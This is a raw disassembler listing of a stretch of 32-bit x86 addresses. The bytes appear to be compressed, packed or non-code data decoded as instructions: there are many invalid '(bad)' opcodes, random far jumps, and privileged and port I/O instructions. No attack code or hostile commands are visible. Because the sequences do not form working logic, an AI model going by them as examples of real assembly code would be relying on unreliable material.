  4197d8:	imul   esp,DWORD PTR [ebp+0x5dd54ec6],0x10
  4197df:	xchg   esp,eax
  4197e0:	retf   
  4197e1:	retf   0x7b88
  4197e4:	int    0xf1
  4197e6:	push   ebx
  4197e7:	shl    DWORD PTR [ebx],1
  4197e9:	dec    ebp
  4197ea:	stc    
  4197eb:	lock fsubr DWORD PTR [ebx+0x55]
  4197ef:	ret    
  4197f0:	fsub   QWORD PTR [eax+0x2b]
  4197f3:	jo     0x41978d
  4197f5:	sti    
  4197f6:	fwait
  4197f7:	ret    0xdd6a
  4197fa:	add    eax,eax
  4197fc:	ror    BYTE PTR [esi],0x73
  4197ff:	pop    ss
  419800:	xor    edi,edx
  419802:	in     al,0x11
  419804:	push   ebx
  419805:	nop
  419806:	push   ebx
  419807:	jae    0x4197fe
  419809:	pop    esp
  41980a:	xor    eax,0xa2057ada
  41980f:	ret    0x2b4b
  419812:	or     eax,0x5a16cd4d
  419817:	inc    esi
  419818:	dec    edi
  419819:	cmp    eax,0x8e1ca659
  41981e:	(bad)  
  41981f:	mov    eax,ds:0xe4a285b4
  419824:	xlat   BYTE PTR ds:[ebx]
  419825:	das    
  419826:	xor    al,0x37
  419828:	add    DWORD PTR [ebx],ebp
  41982a:	arpl   WORD PTR [esp+eax*1],si
  41982d:	not    BYTE PTR [edx-0x2c]
  419830:	push   0x2f1aba6c
  419835:	shl    esi,0xd7
  419838:	adc    DWORD PTR [edx-0x3cd362f4],0x129544d7
  419842:	sbb    BYTE PTR [ebx],ch
  419844:	lock inc ebp
  419846:	sub    BYTE PTR [ebx-0x18],bl
  419849:	sbb    al,0xc6
  41984b:	sbb    ch,BYTE PTR [edx]
  41984d:	(bad)  
  41984e:	xchg   ebx,eax
  41984f:	sbb    ecx,DWORD PTR [ebx]
  419851:	rcr    DWORD PTR [eax+eax*1+0x2d],cl
  419855:	jg     0x419819
  419857:	inc    esp
  419858:	mov    dh,0x19
  41985a:	dec    ebp
  41985b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41985c:	aam    0xda
  41985e:	xchg   edi,eax
  41985f:	push   es
  419860:	fincstp 
  419862:	test   al,0x4e
  419864:	not    BYTE PTR [ebx]
  419866:	or     eax,0x7069b4a4
  41986b:	and    edx,DWORD PTR [ebx-0x59464740]
  419871:	shl    BYTE PTR [edx+0x78],1
  419874:	pop    ds
  419875:	outs   dx,DWORD PTR ds:[esi]
  419876:	test   DWORD PTR [eax+0x4615c942],ebp
  41987c:	test   BYTE PTR [edx-0x1e],bh
  41987f:	outs   dx,DWORD PTR ds:[esi]
  419880:	push   0xd309cf25
  419885:	add    BYTE PTR [edx+0x5e073a78],dl
  41988b:	shr    DWORD PTR [ecx+0x71],0xeb
  41988f:	xchg   edi,eax
  419890:	inc    esp
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	(bad)  
  419901:	jae    0x419922
  419903:	mov    al,0x8
  419905:	sgdtd  [eax]
  419908:	add    eax,0xdc000001
  41990d:	outs   dx,DWORD PTR ds:[esi]
  41990e:	iret   
  41990f:	xchg   esp,eax
  419910:	inc    esi
  419911:	pop    es
  419912:	dec    edx
  419913:	sub    ebp,esi
  419915:	iret   
  419916:	inc    edi
  419917:	push   esi
  419918:	sub    bh,BYTE PTR [edx-0x4b8a5b0c]
  41991e:	fmul   st,st(7)
  419920:	or     ebx,eax
  419922:	fwait
  419923:	sub    eax,0xc8b7806c
  419928:	mov    dh,BYTE PTR [ebx-0x4d]
  41992b:	in     eax,dx
  41992c:	xor    eax,0xdbb2e138
  419931:	lea    edi,[ebx]
  419933:	ins    BYTE PTR es:[edi],dx
  419934:	ins    BYTE PTR es:[edi],dx
  419935:	jae    0x419911
  419937:	or     ch,dh
  419939:	adc    DWORD PTR [edx-0x3d],0x42
  41993d:	div    BYTE PTR [edx]
  41993f:	jmp    0x419960
  419941:	not    DWORD PTR [ecx+0x305d0897]
  419947:	fidivr DWORD PTR [eax-0x658c3bbc]
  41994d:	call   DWORD PTR [ebp+0x4968678c]
  419953:	idiv   BYTE PTR [edi+0x2f55d436]
  419959:	xor    ah,0xeb
  41995c:	lods   al,BYTE PTR ds:[esi]
  41995d:	cmp    bl,BYTE PTR [ecx+0x75]
  419960:	sar    DWORD PTR ds:0x98d46ef5,0x4c
  419967:	jae    0x4199a2
  419969:	mul    DWORD PTR [edx-0x7]
  41996c:	pushf  
  41996d:	inc    edi
  41996e:	fbstp  TBYTE PTR ds:0x40e26865
  419974:	dec    eax
  419975:	add    eax,0xcbcfa8b8
  41997a:	dec    esi
  41997b:	mov    ah,0xe2
  41997d:	into   
  41997e:	fidiv  DWORD PTR [ebx+0x6305363c]
  419984:	sbb    edi,DWORD PTR [ebp+0x12]
  419987:	push   ebx
  419988:	dec    ebp
  419989:	push   esi
  41998a:	repz sti 
  41998c:	clc    
  41998d:	mov    al,ds:0xb75716cf
  419992:	xor    DWORD PTR [edx],0x5c85f7df
  419998:	mov    cl,0x44
  41999a:	sub    DWORD PTR [ebx+0x76058fb9],esp
  4199a0:	mov    ch,BYTE PTR ss:[ebp+0x74]
  4199a4:	ja     0x419947
  4199a6:	jge    0x41997c
  4199a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a9:	add    dh,BYTE PTR [esi]
  4199ab:	xchg   ebp,eax
  4199ac:	mov    dl,0xb2
  4199ae:	cmp    BYTE PTR [eax+0x1535a629],ah
  4199b4:	loopne 0x419969
  4199b6:	adc    eax,0xda664ff
  4199bb:	inc    edi
  4199bc:	test   DWORD PTR es:[ecx+eiz*1+0x21],edx
  4199c1:	std    
  4199c2:	fadd   DWORD PTR [ebx]
  4199c4:	lea    edx,[ebx]
  4199c6:	mov    esi,0xd20350dd
  4199cb:	jecxz  0x4199aa
  4199cd:	mov    ds:0x403937dc,eax
  4199d2:	mov    dh,0x2e
  4199d4:	shl    DWORD PTR [ecx],1
  4199d6:	scas   al,BYTE PTR es:[edi]
  4199d7:	pop    esp
  4199d8:	jmp    0x41e:0xb1d67522
  4199df:	push   edi
  4199e0:	or     ebx,DWORD PTR ds:0xa462ed50
  4199e6:	pop    esp
  4199e7:	divps  xmm4,XMMWORD PTR [eax]
  4199ea:	pop    ds
  4199eb:	fwait
  4199ec:	retf   0x99a5
  4199ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199f0:	pop    esp
  4199f1:	adc    al,0x26
  4199f3:	and    BYTE PTR [ecx],bl
  4199f5:	lods   al,BYTE PTR gs:[esi]
  4199f7:	or     cl,BYTE PTR [ecx-0x60225ed9]
  4199fd:	test   al,0x4f
  4199ff:	xchg   BYTE PTR [ecx-0x3f],bl
  419a02:	std    
  419a03:	jbe    0x419a23
  419a05:	inc    edi
  419a06:	outs   dx,BYTE PTR ds:[esi]
  419a07:	cmovge ecx,ebp
  419a0a:	and    esi,DWORD PTR [ecx+0x1f]
  419a0d:	push   bx
  419a0f:	sub    eax,ecx
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x6dc215d3
  419a81:	xchg   esi,eax
  419a82:	jmp    0x419aa5
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    BYTE PTR [edx],bl
  419a8d:	rcr    cl,0x90
  419a90:	add    bl,BYTE PTR [ebx]
  419a92:	cmp    ch,BYTE PTR [edx]
  419a94:	jmp    0x5146ac36
  419a99:	jge    0x419b0b
  419a9b:	dec    eax
  419a9c:	jne    0x419a27
  419a9e:	cwde   
  419a9f:	repz out 0x1,eax
  419aa2:	bound  eax,QWORD PTR [eax-0x6bf2c4f2]
  419aa8:	aas    
  419aa9:	cmp    al,0x33
  419aab:	mov    ecx,0xfca05106
  419ab0:	push   esi
  419ab1:	test   eax,0xfcc875b2
  419ab6:	cmp    al,0x90
  419ab8:	je     0x419a8c
  419aba:	push   ds
  419abb:	push   ecx
  419abc:	or     al,0xb6
  419abe:	and    BYTE PTR [edi-0x60d5d42f],ch
  419ac4:	call   0x2a46:0x9ace9d6a
  419acb:	inc    ebp
  419acc:	inc    esp
  419acd:	push   ds
  419ace:	es mov cl,0x2f
  419ad1:	add    esp,ebp
  419ad3:	sbb    al,0x28
  419ad5:	cmp    eax,0xd88ce31d
  419ada:	shr    BYTE PTR [eax+0x3d],cl
  419add:	sbb    BYTE PTR [ecx-0x3b21b869],0x50
  419ae4:	in     al,0x8d
  419ae6:	jnp    0x419af0
  419ae8:	fsub   DWORD PTR [edi+0x3063f30f]
  419aee:	or     DWORD PTR [esi],edi
  419af0:	stos   BYTE PTR es:[edi],al
  419af1:	bound  ecx,QWORD PTR [edi+eax*8]
  419af4:	sahf   
  419af5:	loopne 0x419af3
  419af7:	fst    DWORD PTR ds:0x10285e23
  419afd:	adc    edi,eax
  419aff:	std    
  419b00:	dec    esp
  419b01:	repnz mov bl,0xbb
  419b04:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419b06:	shl    DWORD PTR [ebp+0x4f],0xd9
  419b0a:	mov    ebx,0xf2472c00
  419b0f:	(bad)  
  419b10:	out    dx,al
  419b11:	jo     0x419ab8
  419b13:	les    ebx,FWORD PTR [ecx+0x4b01b807]
  419b19:	push   ecx
  419b1a:	not    DWORD PTR [eax]
  419b1c:	sahf   
  419b1d:	test   DWORD PTR [edx],0xcfac64e5
  419b23:	enter  0x83b5,0x15
  419b27:	retf   0x2ed6
  419b2a:	and    al,0xcd
  419b2c:	mov    ch,0x57
  419b2e:	into   
  419b2f:	inc    ecx
  419b30:	and    eax,0x4fdc3660
  419b35:	data16 loop 0x419b73
  419b38:	sub    dh,ch
  419b3a:	and    BYTE PTR [eax],ch
  419b3c:	leave  
  419b3d:	and    eax,0x5649f1e1
  419b42:	int    0xc9
  419b44:	adc    ebx,DWORD PTR [edx+0x74eb3e8f]
  419b4a:	sub    bh,cl
  419b4c:	push   edx
  419b4d:	stos   BYTE PTR es:[edi],al
  419b4e:	dec    edx
  419b4f:	or     al,0x59
  419b51:	loopne 0x419b58
  419b53:	pusha  
  419b54:	or     ebp,ebp
  419b56:	xor    eax,0x6d2e8898
  419b5b:	add    bl,BYTE PTR [ecx+0x7a31964d]
  419b61:	out    0xf8,al
  419b63:	push   ss
  419b64:	rol    BYTE PTR [ecx-0x43],1
  419b67:	shl    DWORD PTR [edx],1
  419b69:	cmp    esi,DWORD PTR [eax-0x15]
  419b6c:	shl    DWORD PTR ds:0x44efeb2d,cl
  419b72:	xor    bl,BYTE PTR [ebx]
  419b74:	dec    eax
  419b75:	push   es
  419b76:	or     bh,ch
  419b78:	cmp    bh,cl
  419b7a:	gs xchg edi,eax
  419b7c:	adc    ch,BYTE PTR [edi-0x7c936a16]
  419b82:	gs jb  0x419bf7
  419b85:	or     DWORD PTR [esi+esi*2],ecx
  419b88:	sub    eax,0x2a34db3a
  419b8d:	pop    eax
  419b8e:	push   es
  419b8f:	(bad)  
  419b90:	lds    eax,FWORD PTR [eax]
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x7d
  419c01:	in     al,0x8c
  419c03:	cld    
  419c04:	adc    dl,BYTE PTR [ecx]
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0xc7000001
  419c0d:	not    BYTE PTR [esi-0x161b161e]
  419c13:	push   esi
  419c14:	sbb    al,0x73
  419c16:	inc    ecx
  419c17:	(bad)  
  419c18:	gs push es
  419c1a:	mov    edi,0x786f2481
  419c1f:	bnd jbe 0x419c6a
  419c22:	sub    dh,BYTE PTR [esi+0x20]
  419c25:	rcr    DWORD PTR [edx],1
  419c27:	jg     0x419c5b
  419c29:	xor    esi,DWORD PTR [edi]
  419c2b:	scas   al,BYTE PTR es:[edi]
  419c2c:	retf   0x5331
  419c2f:	test   edi,0x7fab29da
  419c35:	push   ss
  419c36:	daa    
  419c37:	gs mov cl,0xbc
  419c3a:	das    
  419c3b:	xchg   BYTE PTR [edi],dh
  419c3d:	daa    
  419c3e:	(bad)  
  419c3f:	cdq    
  419c40:	inc    esp
  419c41:	adc    esp,DWORD PTR ds:0xab2c34dc
  419c47:	or     ax,WORD PTR [edx]
  419c4a:	jmp    0xabcb:0x8f85961
  419c51:	call   0xa11de62
  419c56:	sub    esi,DWORD PTR [ebp+0x2f]
  419c59:	lds    edi,FWORD PTR [ebx]
  419c5b:	mov    WORD PTR ds:0x6bda3af1,es
  419c61:	fstp   DWORD PTR [esi+eiz*8+0x45fc774b]
  419c68:	call   0x8fe99962
  419c6d:	jns    0x419c94
  419c6f:	rcr    ebp,1
  419c71:	cs cmp eax,0xf3761ce1
  419c77:	push   esp
  419c78:	leave  
  419c79:	in     al,dx
  419c7a:	int3   
  419c7b:	test   bh,cl
  419c7d:	add    esi,esi
  419c7f:	inc    esi
  419c80:	xor    bh,BYTE PTR [ebp+0x4]
  419c83:	adc    edx,ecx
  419c85:	add    dh,BYTE PTR [edx-0x4166f730]
  419c8b:	push   0x4a77c44
  419c90:	call   0x7623:0xc02bd3c3
  419c97:	mov    esi,0x4d318597
  419c9c:	clc    
  419c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c9e:	push   ebp
  419c9f:	aad    0xd5
  419ca1:	(bad)  
  419ca3:	pop    ds
  419ca4:	mov    DWORD PTR [ebx-0x7a8e1f1a],edx
  419caa:	popf   
  419cab:	or     DWORD PTR [eax],eax
  419cad:	pop    ebx
  419cae:	push   edi
  419caf:	cdq    
  419cb0:	jp     0x419cab
  419cb2:	adc    DWORD PTR [ebx+0x1b],ecx
  419cb5:	adc    esi,DWORD PTR [ecx+0x2d0e62a4]
  419cbb:	adc    ecx,DWORD PTR [ecx+0x24]
  419cbe:	mov    dl,0x43
  419cc0:	jge    0x419c8c
  419cc2:	xchg   ecx,eax
  419cc3:	adc    eax,0xcdec7866
  419cc8:	or     eax,0xc45c071a
  419ccd:	pop    esi
  419cce:	fnstcw WORD PTR [ebx+ecx*4-0x2c]
  419cd2:	shl    DWORD PTR [ebx+0x32f0fbb1],cl
  419cd8:	pop    ebp
  419cd9:	repnz adc eax,0xc69d722b
  419cdf:	and    eax,DWORD PTR [ebx-0x40]
  419ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ce3:	ret    
  419ce4:	inc    ebx
  419ce5:	or     al,0xd
  419ce7:	cwde   
  419ce8:	inc    BYTE PTR [esi+0x9]
  419ceb:	xchg   dh,bl
  419ced:	test   DWORD PTR [edx],ebx
  419cef:	jbe    0x419c72
  419cf1:	xor    DWORD PTR [esi+0x49],edi
  419cf4:	les    ecx,FWORD PTR [eax+edx*4]
  419cf7:	adc    eax,0x6243dcdc
  419cfc:	fsub   DWORD PTR [esi]
  419cfe:	and    bl,BYTE PTR [ebx-0x2b]
  419d01:	cmp    al,0x19
  419d03:	js     0x419d07
  419d05:	icebp  
  419d06:	pop    ss
  419d07:	pop    ebx
  419d08:	mov    dl,BYTE PTR [edx-0x1979a]
  419d0e:	fiadd  WORD PTR [ebp+0x39]
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ss fcmovbe st,st(7)
  419d81:	pop    edi
  419d82:	pop    ecx
  419d83:	and    al,0x17
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x1b000001,al
  419d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d8e:	outs   dx,BYTE PTR ds:[esi]
  419d8f:	data16 ins BYTE PTR es:[edi],dx
  419d91:	pop    edx
  419d92:	fistp  QWORD PTR [ebx-0x9]
  419d95:	std    
  419d96:	jl     0x419d18
  419d98:	in     al,dx
  419d99:	arpl   WORD PTR [ebp+0x7023aa27],di
  419d9f:	bound  esi,QWORD PTR [ebx+ebp*8]
  419da2:	xor    al,0xa7
  419da4:	lods   eax,DWORD PTR ds:[esi]
  419da5:	sar    DWORD PTR [bx-0x1a],cl
  419da9:	inc    esp
  419daa:	fneni(8087 only) 
  419dac:	out    0xab,eax
  419dae:	mov    edx,0xf35467a2
  419db3:	cmp    ebx,0x441fb14b
  419db9:	pop    ecx
  419dba:	dec    edi
  419dbb:	xchg   ebx,eax
  419dbc:	sbb    edx,esp
  419dbe:	push   edx
  419dbf:	cmp    ebx,ebx
  419dc1:	stos   DWORD PTR es:[edi],eax
  419dc2:	jmp    0x7e9fea13
  419dc7:	call   0xb6a31535
  419dcc:	jmp    0x42127119
  419dd1:	stos   DWORD PTR es:[edi],eax
  419dd2:	clc    
  419dd3:	test   BYTE PTR [esi+0x2],dh
  419dd6:	repnz and ebx,DWORD PTR [edx-0x52]
  419dda:	push   edi
  419ddb:	push   ebp
  419ddc:	jns    0x419e1b
  419dde:	fwait
  419ddf:	(bad)  
  419de0:	jmp    0xd79a6ff6
  419de5:	xchg   esi,eax
  419de6:	mov    eax,ds:0xd456228c
  419deb:	ds test al,0x8
  419dee:	aad    0xc5
  419df0:	bound  dx,DWORD PTR [ebp-0x2f]
  419df4:	pop    es
  419df5:	out    dx,al
  419df6:	scas   al,BYTE PTR es:[edi]
  419df7:	in     eax,dx
  419df8:	test   DWORD PTR [ebx+eax*2],eax
  419dfb:	dec    esi
  419dfc:	push   eax
  419dfd:	rcl    BYTE PTR [ebx+0x20],1
  419e00:	imul   cx,WORD PTR [edi+0x59],0xe9d6
  419e06:	addr16 clc 
  419e08:	sbb    BYTE PTR [edx-0x3a],0x96
  419e0c:	out    dx,al
  419e0d:	retf   0x62d4
  419e10:	loope  0x419e5f
  419e12:	cmp    al,0x22
  419e14:	sahf   
  419e15:	shl    dh,1
  419e17:	hlt    
  419e18:	push   ebx
  419e19:	jns    0x419df5
  419e1b:	pop    ecx
  419e1c:	dec    ebp
  419e1d:	sub    esi,0x1e
  419e20:	adc    BYTE PTR [esi+0x14da4916],bl
  419e26:	cmp    al,0x7a
  419e28:	mov    esp,0x83355003
  419e2d:	jge    0x419dc7
  419e2f:	rcl    DWORD PTR [edi+0x385fc4cf],cl
  419e35:	pop    esp
  419e36:	(bad)  
  419e37:	xchg   ebx,eax
  419e38:	add    ebx,ebp
  419e3a:	popf   
  419e3b:	xchg   esi,eax
  419e3c:	jnp    0x419e97
  419e3e:	loope  0x419e9a
  419e40:	xor    edx,DWORD PTR [edx-0x2f01e1de]
  419e46:	je     0x419e57
  419e48:	mov    BYTE PTR [eax+0x2f85717d],dh
  419e4e:	cmp    DWORD PTR [ebx+0x1659d023],eax
  419e54:	jp     0x419ebe
  419e56:	mov    ah,0xe9
  419e58:	cmp    DWORD PTR [ecx+esi*4-0x79344b50],esp
  419e5f:	push   eax
  419e60:	lods   al,BYTE PTR ds:[esi]
  419e61:	fsubr  DWORD PTR [edx]
  419e63:	into   
  419e64:	fs js  0x419eab
  419e67:	push   ecx
  419e68:	aaa    
  419e69:	mov    eax,0xee308e6d
  419e6e:	jmp    0xf1c1b3ee
  419e73:	jbe    0x419ea7
  419e75:	bound  edi,QWORD PTR [ecx+0x6f67dfc6]
  419e7b:	rcr    edx,0xa7
  419e7e:	mov    cl,ah
  419e80:	js     0x419e59
  419e82:	sbb    al,0x9e
  419e84:	jmp    FWORD PTR [ecx]
  419e86:	jo     0x419e1f
  419e88:	jo     0x419eae
  419e8a:	jo     0x419e71
  419e8c:	push   0xffffff84
  419e8e:	and    eax,0x4bcb
	...
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	jmp    0x113:0x1cbc1a5c
  419f07:	add    BYTE PTR ds:0x6b000001,al
  419f0d:	cmp    BYTE PTR [edi],cl
  419f0f:	mov    ebp,0xa3621472
  419f14:	mov    cs,WORD PTR [ecx+0x2d]
  419f17:	mov    bh,0x7a
  419f19:	cwde   
  419f1a:	pop    edi
  419f1b:	sti    
  419f1c:	imul   edi,edi,0xc48b5808
  419f22:	(bad)  
  419f24:	fist   WORD PTR [edi+0x28]
  419f27:	xor    eax,0xba70c081
  419f2c:	outs   dx,DWORD PTR ds:[esi]
  419f2d:	(bad)  
  419f2e:	xlat   BYTE PTR ds:[ebx]
  419f2f:	outs   dx,BYTE PTR ds:[esi]
  419f30:	mov    al,ds:0xdce427f9
  419f35:	push   ds
  419f36:	mov    ecx,0x937885e5
  419f3b:	jns    0x419f8c
  419f3d:	xor    dh,BYTE PTR [esi*1-0x778f4954]
  419f44:	dec    esi
  419f45:	push   esp
  419f46:	xchg   esp,eax
  419f47:	stos   BYTE PTR es:[edi],al
  419f48:	lods   eax,DWORD PTR ds:[esi]
  419f49:	icebp  
  419f4a:	jp     0x419f29
  419f4c:	mov    BYTE PTR [ebp-0x2523ce6e],al
  419f52:	push   0xa3a60036
  419f57:	sub    esp,DWORD PTR [ecx-0x47]
  419f5a:	ffree  st(5)
  419f5c:	ja     0x419f4f
  419f5e:	pop    esp
  419f5f:	icebp  
  419f60:	(bad)  
  419f61:	les    ebx,FWORD PTR [edi+0x810ca2]
  419f67:	and    esp,ebx
  419f69:	sti    
  419f6a:	outs   dx,DWORD PTR ds:[esi]
  419f6b:	mov    esp,edx
  419f6d:	call   0xcf6e6b3e
  419f72:	lds    esi,FWORD PTR [esi]
  419f74:	and    ch,al
  419f76:	pop    edx
  419f77:	push   eax
  419f78:	pop    ecx
  419f79:	fistp  WORD PTR [esi]
  419f7b:	sahf   
  419f7c:	inc    eax
  419f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f7e:	aad    0x26
  419f80:	and    ch,bh
  419f82:	xchg   ebx,eax
  419f83:	xchg   ebp,eax
  419f84:	jmp    0x419fc6
  419f86:	cdq    
  419f87:	jmp    DWORD PTR [edx+0x28]
  419f8a:	mov    al,0x8c
  419f8c:	mov    fs,WORD PTR [esi]
  419f8e:	mov    cl,al
  419f90:	mov    ecx,0x18440090
  419f95:	and    dh,ah
  419f97:	mov    ds:0xa83203cd,eax
  419f9c:	fwait
  419f9d:	sub    ecx,DWORD PTR [ecx-0x4b]
  419fa0:	test   cl,ah
  419fa2:	inc    esi
  419fa3:	int3   
  419fa4:	jae    0x419fbe
  419fa6:	xor    DWORD PTR [edi-0x5d],edi
  419fa9:	add    eax,0x64bf00bf
  419fae:	mov    edx,0x34e36883
  419fb3:	ins    DWORD PTR es:[edi],dx
  419fb4:	inc    ebp
  419fb5:	add    al,0xda
  419fb7:	hlt    
  419fb8:	dec    edi
  419fb9:	and    dl,bh
  419fbb:	push   ds
  419fbc:	xor    eax,0x44447e19
  419fc1:	xchg   edx,eax
  419fc2:	pop    ds
  419fc3:	mov    eax,ds:0x230cd947
  419fc8:	in     eax,dx
  419fc9:	outs   dx,DWORD PTR ds:[esi]
  419fca:	repnz dec eax
  419fcc:	inc    eax
  419fcd:	pusha  
  419fce:	xchg   ecx,eax
  419fcf:	mov    bl,0x75
  419fd1:	cmp    DWORD PTR [ecx-0x54],ebp
  419fd4:	scas   al,BYTE PTR es:[edi]
  419fd5:	cmp    eax,0xfd9938a5
  419fda:	(bad)  
  419fdb:	repz test al,0x14
  419fde:	and    DWORD PTR [ebx],edx
  419fe0:	ficomp WORD PTR [edi+0x58]
  419fe3:	imul   edi,DWORD PTR [edi-0x71],0x4ac7daa9
  419fea:	jmp    0xd68f:0x88d2c340
  419ff1:	into   
  419ff2:	dec    ebp
  419ff3:	sub    al,0x4f
  419ff5:	pop    esp
  419ff6:	mov    ah,0xe4
  419ff8:	call   0x96d2:0xdad2167a
  419fff:	fbld   TBYTE PTR [eax-0x50]
  41a002:	adc    ah,dh
  41a004:	iret   
  41a005:	ret    0x9b39
  41a008:	push   edx
  41a009:	(bad)  
  41a00a:	sbb    DWORD PTR [ebp+edi*1-0x32015be0],edi
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x54],bh
  41a081:	loop   0x41a05c
  41a083:	or     DWORD PTR [ecx],esp
  41a085:	adc    al,0x1
  41a087:	add    BYTE PTR ds:0xe1000001,al
  41a08d:	sar    DWORD PTR [ecx],cl
  41a08f:	or     DWORD PTR [edx+0x117bc76f],eax
  41a095:	mov    ah,0x8e
  41a097:	retf   
  41a098:	mov    bh,0x5f
  41a09a:	or     al,0x5a
  41a09c:	inc    eax
  41a09d:	lods   eax,DWORD PTR ds:[esi]
  41a09e:	sub    dl,BYTE PTR [esi+0x17]
  41a0a1:	push   edi
  41a0a2:	test   al,0x8b
  41a0a4:	dec    esi
  41a0a5:	add    eax,DWORD PTR [esi-0x2f]
  41a0a8:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a0aa:	mov    ds:0xd23d5358,al
  41a0af:	ins    BYTE PTR es:[edi],dx
  41a0b0:	add    BYTE PTR [ebp-0x7de12860],dh
  41a0b6:	cmp    al,0x18
  41a0b8:	aas    
  41a0b9:	push   ebp
  41a0ba:	jbe    0x41a042
  41a0bc:	cdq    
  41a0bd:	ficom  WORD PTR [eax]
  41a0bf:	pushf  
  41a0c0:	xor    esi,DWORD PTR [esi+0x10328bb6]
  41a0c6:	sbb    al,0x7e
  41a0c8:	mov    cl,0x60
  41a0ca:	inc    ebp
  41a0cb:	ja     0x41a0b3
  41a0cd:	dec    ecx
  41a0ce:	mov    ?,WORD PTR [ebx-0x5d]
  41a0d1:	leave  
  41a0d2:	mov    bl,0x4d
  41a0d4:	xor    ah,BYTE PTR [ebp-0x5d9371d]
  41a0da:	fild   DWORD PTR [ecx+0x46]
  41a0dd:	pusha  
  41a0de:	jae    0x41a0ea
  41a0e0:	inc    esi
  41a0e1:	test   al,0x16
  41a0e3:	and    DWORD PTR [ebx+eax*1+0x37],edi
  41a0e7:	inc    ecx
  41a0e8:	in     eax,0xb
  41a0ea:	xor    al,0x54
  41a0ec:	icebp  
  41a0ed:	push   0xd9105280
  41a0f2:	shr    BYTE PTR [ebx+0x44ee7ea0],1
  41a0f8:	outs   dx,DWORD PTR ds:[esi]
  41a0f9:	sub    bh,BYTE PTR [edx-0x1309783c]
  41a0ff:	adc    BYTE PTR [edi-0x1bd0b13d],dh
  41a105:	jl     0x41a16a
  41a107:	lahf   
  41a108:	call   0x63ebabae
  41a10d:	and    DWORD PTR ds:0x2152d108,edx
  41a113:	leave  
  41a114:	add    al,0x6a
  41a116:	push   ss
  41a117:	movups xmm5,XMMWORD PTR [ecx]
  41a11a:	stos   BYTE PTR es:[edi],al
  41a11b:	outs   dx,BYTE PTR ds:[esi]
  41a11c:	xchg   edi,eax
  41a11d:	mov    eax,0x937677a
  41a122:	dec    edx
  41a123:	pop    ecx
  41a124:	sahf   
  41a125:	xchg   edi,eax
  41a126:	or     eax,esi
  41a128:	xchg   esi,eax
  41a129:	lea    edi,[edx+0x3f]
  41a12c:	mov    ds:0x75293cbb,al
  41a131:	scas   eax,DWORD PTR es:[edi]
  41a132:	pop    ecx
  41a133:	ds sahf 
  41a135:	sub    BYTE PTR [eax+edx*1+0x38],0x9c
  41a13a:	std    
  41a13b:	inc    edx
  41a13c:	cli    
  41a13d:	retf   
  41a13e:	mov    cs:0x4dc2e503,eax
  41a144:	xchg   edx,eax
  41a145:	pop    esi
  41a146:	pop    ebp
  41a147:	cs pop esp
  41a149:	ret    0xefbb
  41a14c:	sbb    eax,0x90966aae
  41a151:	adc    dh,BYTE PTR [ebx]
  41a153:	ja     0x41a124
  41a155:	sbb    al,0x18
  41a157:	add    eax,0x53873913
  41a15c:	push   0x77405b7
  41a161:	lea    esi,[edx-0x61]
  41a164:	popa   
  41a165:	loope  0x41a1ce
  41a167:	lods   eax,DWORD PTR ds:[esi]
  41a168:	fwait
  41a169:	mov    WORD PTR [esi+edi*2],fs
  41a16c:	ss inc ebp
  41a16e:	mov    bl,0xef
  41a170:	inc    ebp
  41a171:	sub    eax,0x3b86ea72
  41a176:	cmp    esi,esi
  41a178:	dec    esi
  41a179:	(bad)  
  41a17b:	sbb    ebp,DWORD PTR [eax+ebp*8+0x3bc6f783]
  41a182:	jno    0x41a1fb
  41a184:	test   DWORD PTR [ecx-0x34ef04fc],edx
  41a18a:	jle    0x41a20b
  41a18c:	out    dx,al
  41a18d:	enter  0xf787,0x1a
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	aam    0x2c
  41a202:	out    0xa9,al
  41a204:	es adc eax,0x1050001
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	jo     0x41a24c
  41a20e:	int3   
  41a20f:	pop    ds
  41a210:	retf   0x6ab0
  41a213:	push   esp
  41a214:	xchg   ebp,eax
  41a215:	call   0x7b293774
  41a21a:	mov    bh,BYTE PTR [edx+0x0]
